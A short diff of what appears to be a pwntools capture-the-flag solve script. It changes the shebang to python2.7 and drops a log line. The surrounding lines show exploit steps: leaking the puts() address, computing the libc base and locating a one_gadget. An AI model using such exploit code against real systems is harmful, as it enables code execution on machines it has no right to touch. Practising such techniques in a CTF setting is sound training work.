@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2.7
 
 
 from pwn import *
@@ -58,7 +58,6 @@ def solve():
     libc.address = int(io.recvline(), 16) - libc.sym.puts
     log.info("puts() found at: " + hex(libc.sym.puts))
     log.info("libc base found at: " + hex(libc.address))
-    log.info("system() found at: "+ hex(libc.sym.system))
     one_gadget = libc.address + ONE_GADGET_OFFSET
     log.info("one_gadget found at: " + hex(one_gadget))
 
